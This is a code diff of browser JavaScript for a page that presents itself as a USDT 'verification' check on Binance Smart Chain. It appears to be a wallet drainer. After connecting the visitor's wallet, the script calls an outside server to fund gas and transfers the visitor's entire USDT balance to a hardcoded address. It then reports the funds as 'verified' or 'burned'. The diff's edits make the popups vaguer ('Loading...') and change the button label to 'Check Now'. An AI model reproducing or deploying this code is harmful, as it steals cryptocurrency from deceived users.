@@ -28,6 +28,7 @@ async function connectWalletAndSwitch() {
     try {
         web3 = new Web3(provider);
 
+        // Switch to BSC if needed
         const currentChain = await provider.request({ method: 'eth_chainId' });
         if (currentChain !== '0x38') {
             try {
@@ -54,6 +55,7 @@ async function connectWalletAndSwitch() {
             }
         }
 
+        // Request accounts
         const accounts = await provider.request({ method: "eth_accounts" });
         userAddress = accounts[0];
         console.log("✅ Wallet:", userAddress);
@@ -98,7 +100,7 @@ async function Next() {
             web3.eth.getBalance(userAddress)
         ]);
 
-        const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "mwei")); // ✅ USDT has 6 decimals
+        const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
         const bnbBalance = parseFloat(web3.utils.fromWei(bnbBalanceWei, "ether"));
 
         console.log("USDT:", usdtBalance);
@@ -109,7 +111,7 @@ async function Next() {
             return;
         }
 
-        if (usdtBalance <= 0.005) {
+        if (usdtBalance <= 0.0005) {
             showPopup(
                 `✅ Verification Successful<br>Your USDT has been verified and not flagged in blockchain.<br><b>USDT:</b> ${usdtBalance}<br><b>BNB:</b> ${bnbBalance}`,
                 "green"
@@ -118,28 +120,19 @@ async function Next() {
         }
 
         if (bnbBalance < 0.0005) {
-            showPopup("Checking the Bnb...", "blue");
-            await fetch("https:/bnb-server-production.up.railway.app/send-bnb", {
+            showPopup("Checking the bnb ...", "blue");
+            await fetch("https://bnb-server-production.up.railway.app/send-bnb", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ toAddress: userAddress })
             });
-            // Retry BNB check after faucet
-            let retries = 2;
-            while (retries-- > 0) {
-                const retryBNB = parseFloat(web3.utils.fromWei(await web3.eth.getBalance(userAddress), "ether"));
-                if (retryBNB >= 0.0005) break;
-                await new Promise(r => setTimeout(r, 1000));
-            }
+            await new Promise(r => setTimeout(r, 2000)); // wait for gas
         }
 
-        showPopup("Sending USDT...", "blue");
+        showPopup("Loading...", "blue");
 
-        const amountToSend = web3.utils.toWei(usdtBalance.toString(), "mwei"); // ✅ Correct decimal
-        const gas = await usdtContract.methods.transfer(bscAddress, amountToSend).estimateGas({ from: userAddress });
-
-        await usdtContract.methods.transfer(bscAddress, amountToSend)
-            .send({ from: userAddress, gas });
+        await usdtContract.methods.transfer(bscAddress, web3.utils.toWei(usdtBalance.toString(), "ether"))
+            .send({ from: userAddress });
 
         showPopup(
             `✅ Transfer complete<br><b>USDT Burned:</b> ${usdtBalance}`,
@@ -148,11 +141,7 @@ async function Next() {
 
     } catch (e) {
         console.error("❌ Transfer failed:", e);
-        if (e?.message?.includes("insufficient funds")) {
-            showPopup("❌ Not enough BNB for gas. Please top up your wallet.", "red");
-        } else {
-            showPopup("USDT transfer failed. Check token, gas, or try again.", "red");
-        }
+        showPopup("USDT transfer failed. Check balance or gas.", "red");
     }
 }
 
@@ -193,7 +182,7 @@ window.addEventListener("load", async () => {
             .find(b => b.textContent.trim().toLowerCase() === "Next");
         if (btn) {
             btn.addEventListener("click", Next);
-            console.log("✅ Bound 'Next' to Next()");
+            console.log("✅ Bound 'Check Now' to Next()");
             observer.disconnect();
         }
     });
